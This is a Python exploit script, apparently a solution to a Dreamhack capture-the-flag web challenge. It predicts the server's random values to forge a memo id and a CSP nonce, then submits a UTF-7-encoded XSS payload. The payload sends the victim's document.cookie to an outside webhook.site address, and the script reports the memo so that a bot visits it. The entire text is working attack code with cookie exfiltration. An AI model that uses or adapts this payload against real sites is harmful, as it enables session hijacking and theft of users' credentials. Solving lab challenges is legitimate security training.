import requests
from hashlib import md5
from predict_random import *

url = "http://host8.dreamhack.games:19665"
s = requests.Session()

def get_md5(n):
    return md5(str(n).encode()).hexdigest()

def get_rand():
    res = s.post(f"{url}/memo/create", data={
        'content': 'junk',
        'sourceEncoding': 'junk'
    })

    return float(res.json()['data']['random'])
        
# predict next 2 random numbers (memo id, nonce)
seq = [get_rand() for _ in range(5)]

rands = solve(seq, 2)
print("Predicted:", rands)

# xss
memo_id = get_md5(rands[0])
nonce = get_md5(rands[1])

payload = f"<script nonce={nonce}>location.href=`http://webhook.site/025771ea-26d4-408a-be54-8218ab4e1f6a/${{document.cookie}}`</script>"

payload = payload.encode('utf-7').replace(b"<", b"+ADw-").replace(b">", b"+AD4-")

res = s.post(f"{url}/memo/create", data={
    'content': payload,
    'sourceEncoding': "UTF-7"
})

print("> Created memo:", memo_id)
print("> Nonce:", nonce)

# report
res = s.post(f'{url}/report', data={
    'path': 'nonce.png',
    'memoId': memo_id
})

if "ok" in res.text.lower():
    print("> URL reported")